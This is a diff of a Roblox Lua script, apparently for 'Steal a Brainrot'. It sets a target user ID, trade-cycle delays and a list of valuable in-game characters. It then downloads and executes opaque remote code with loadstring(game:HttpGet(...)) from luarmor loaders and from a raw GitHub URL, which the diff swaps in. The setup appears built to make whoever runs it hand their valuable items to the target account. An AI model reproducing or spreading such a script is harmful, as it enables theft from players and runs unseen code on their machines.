@@ -3,7 +3,6 @@ getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
-    ["Foxini Lanternini"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Headless Horseman"] = true,
@@ -14,21 +13,27 @@ getgenv().TARGET_BRAINROTS = {
     ["Dragon Cannelloni"] = true,
     ["Love Love Bear"] = true,
     ["La Supreme Combinasion"] = true,
+    ["Hydra Bunny"] = true,
     ["Celestial Pegasus"] = true,
     ["Cerberus"] = true,
+    ["Bunny and Eggy"] = true,
     ["Popcuru and Fizzuru"] = true,
     ["Rosey and Teddy"] = true,
     ["Capitano Moby"] = true,
     ["Cooki and Milki"] = true,
     ["Burguro And Fryuro"] = true,
+    ["Arcadragon"] = true,
     ["Ketupat Bros"] = true,
     ["Reinito Sleighito"] = true,
     ["Fortunu and Cashuru"] = true,
     ["Los Amigos"] = true,
     ["La Secret Combinasion"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Foxini Lanternini"] = true,
     ["Los Sekolahs"] = true,
     ["Signore Carapace"] = true,
     ["La Casa Boo"] = true,
+    ["Cash or Card"] = true,
     ["Fragrama and Chocrama"] = true,
     ["La Food Combinasion"] = true,
     ["Elefanto Frigo"] = true,
@@ -37,23 +42,23 @@ getgenv().TARGET_BRAINROTS = {
     ["Sammyni Fattini"] = true,
     ["Festive 67"] = true,
     ["Cloverat Clapat"] = true,
+    ["Antonio"] = true,
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
-    ["Tirilikalika Tirilikalako"] = true,
-    ["Orcaledon"] = true,
-    ["Tictac Sahur"] = true,
-    ["La Taco Combinasion"] = true,
-    ["La Ginger Sekolah"] = true,
-    ["Los Spaghettis"] = true,
-    ["Ventoliero Pavonero"] = true,
-    ["Antonio"] = true,
     ["Jolly Jolly Sahur"] = true,
-    ["Dug dug dug"] = true,
-    ["Lovin Rose"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Swaggy Bros"] = true,
+    ["Chillin Chili"] = true,
+    ["Los Chillis"] = true,
+    ["Digi Narwhal"] = true,
+    ["Kalika Bros"] = true,
+    ["Gym Bros"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Centrucci Nuclucci"] = true,
     ["Fragola La La La"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/971db84d8383b29c9951aada82aff38f.lua"))()
